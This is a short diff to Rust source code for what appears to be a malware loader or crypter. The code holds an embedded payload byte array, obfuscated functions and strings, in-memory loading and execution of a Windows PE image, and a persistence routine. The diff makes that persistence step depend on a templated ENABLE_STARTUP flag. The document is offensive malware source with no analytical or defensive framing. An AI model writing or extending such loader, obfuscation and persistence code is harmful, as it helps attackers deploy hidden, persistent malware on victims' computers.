@@ -116,6 +116,9 @@ const PAYLOAD: &[u8] = &[
 ];
 
 #[cfg(windows)]
+const ENABLE_STARTUP: bool = {{STARTUP_PLACEHOLDER}};
+
+#[cfg(windows)]
 #[obfuscate(garbage = true, len = 12)]
 unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
     let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
@@ -344,8 +347,10 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();
 
     // Save payload for persistence
-    if let Err(e) = persistence::save_payload_with_persistence(pe_data) {
-        eprintln!("{}{}", obfuscate_string!("[WARNING] Persistence failed: "), e);
+    if ENABLE_STARTUP {
+        if let Err(e) = persistence::save_payload_with_persistence(pe_data) {
+            eprintln!("{}{}", obfuscate_string!("[WARNING] Persistence failed: "), e);
+        }
     }
 
     // Execute PE
